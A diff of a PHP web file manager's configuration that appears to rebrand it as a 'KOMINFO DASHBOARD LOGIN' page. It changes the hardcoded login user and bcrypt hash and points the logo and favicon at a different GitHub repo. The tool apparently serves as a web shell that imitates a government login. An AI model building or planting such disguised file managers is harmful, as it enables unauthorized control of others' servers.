@@ -4,7 +4,7 @@ define('VERSION', '1.0.2');
 define('APP_TITLE', 'KOMINFO DASHBOARD LOGIN');
 $use_auth = true;
 $auth_users = array(
-    'YBLC' => '$2a$12$a5ngVrzyBzW4LBMCRrxgAOMDqOesP22JXzlG7hd60eZnjRXoMuA6a'
+    'bunnyman' => '$2a$12$bnrpSdyacgY61MP5rHjeLOP7GfAcd/hu9l/OKGYeX0K6SJPccIneq'
 );
 $readonly_users = array(
     'user'
@@ -23,7 +23,7 @@ $datetime_format = 'm/d/Y g:i A';
 $path_display_mode = 'full';
 $allowed_file_extensions = '';
 $allowed_upload_extensions = '';
-$favicon_path = 'https://raw.githubusercontent.com/Lamersxcode/Records/main/Filemanager/img/kominfo.ico';
+$favicon_path = 'https://raw.githubusercontent.com/InvisibleBunny/Records/main/Bunny-FM/media/kominfo.ico';
 $exclude_items = array();
 $online_viewer = 'google';
 $sticky_navbar = true;
@@ -205,7 +205,7 @@ if ($use_auth) {
                                     <div class="mb-3">
                                        <div class="brand">
                                         </div>
-                                        <div class="text-center"><img src="https://raw.githubusercontent.com/Lamersxcode/Records/main/Filemanager/img/logo-kominfo.png" alt="logo icon" width="100" height="100">
+                                        <div class="text-center"><img src="https://raw.githubusercontent.com/InvisibleBunny/Records/main/Bunny-FM/media/logo-kominfo.png" alt="logo icon" width="100" height="100">
                                             <h1 class="card-title">DASHBOARD LOGIN APP</h1>
                                         </div>
                                     </div>
